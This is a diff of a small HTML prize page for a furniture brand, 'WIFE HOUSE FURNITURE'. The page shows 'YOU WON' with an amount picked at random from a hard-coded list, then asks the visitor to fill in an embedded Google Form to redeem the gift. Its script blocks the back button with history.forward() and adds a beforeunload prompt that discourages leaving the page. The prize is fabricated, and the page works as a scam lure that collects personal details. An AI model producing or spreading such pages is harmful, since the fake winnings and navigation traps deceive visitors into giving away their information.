@@ -1,8 +1,9 @@
+
 <!DOCTYPE html>
 <html lang="en">
   <head>
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>GIFT</title>
+    <title>GIFT </title>
     <!-- Google Font -->
     <link
       href="https://fonts.googleapis.com/css2?family=Poppins:wght@500;600&display=swap"
@@ -11,8 +12,8 @@
     <!-- Stylesheet -->
     <link rel="stylesheet" href="style.css" />
   </head>
-  <body>
-
+  <body bgcolor="red">
+  
     <div class="snowflake">
       ❅
       </div>
@@ -44,35 +45,38 @@
       ❄
       </div>
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-<div class="openboc">
-
-  <div class="card">
-        Congratulations <br>
-    You Won <div id="won"></div>
-  </div>  
-<img src="open box.png" id="img">
-Fill Form To Redeem The Gift
+<div class="tile">
+WIFE HOUSE  FURNITURE
+</div>
+<div class="papaimg">
+<img src="papa.png" id="papimg">
 </div>
 
+<div class="center">
+<div class="flip-card">
+<div class="flip-card-inner">
+<div class="flip-card-front">
+  <img src="boxre.png" id="box">
+</div>
+<div class="flip-card-back">
+  <h1>YOU WON <br>
+    <div id="won"></div></h1>
+  <img src="opere.png" id="box1">
+</div>
+</div>
+</div>
+</div>
+
+<div class="div">
+FILL THE FORM TO REDEEM THE GIFT AMOUNT
+</div>
+
+<iframe src="https://docs.google.com/forms/d/e/1FAIpQLScMDcsuedmjn82PLpHejlC7UQcoSqC7JUKmpoktRt9iAgRQpA/viewform?embedded=true" width="100%" height="776" frameborder="0" marginheight="0" marginwidth="0">Loading…</iframe>
 
 
 
 
 
-   <iframe src="https://docs.google.com/forms/d/e/1FAIpQLScqGplHNkQPWYn_7lFJoSSTCLoZuV37oBxA2G8-qHyEt4fzFg/viewform?embedded=true" width="100%" height="552" frameborder="0" marginheight="0" marginwidth="0">Loading…</iframe>
 
 
 
@@ -82,11 +86,36 @@ Fill Form To Redeem The Gift
 
 
 <script>
- let arrm =[350 , 400 , 440 ,480 ,510,400]
- let random1 = arrm[Math.floor(Math.random() * (arrm.length))];
- document.getElementById("won").innerHTML =random1;
+let arrm =[350 , 400 , 440 ,480 ,510,370,390,360,420,410,430,470,]
+let random1 = arrm[Math.floor(Math.random() * (arrm.length))];
+document.getElementById("won").innerHTML =random1;
+
+
+window.addEventListener('beforeunload', ()=>{
+event.preventDefault();
+ event.returnValue = "";
+})
+
+function preventBack() {
+}
+window.history.forward();
+setTimeout("preventBack()", 0);
+window.onunload
+= function () { null };
+
+
 
 </script>
 
-</body>
+  </body>
 </html>
+
+
+
+
+
+
+
+
+
+
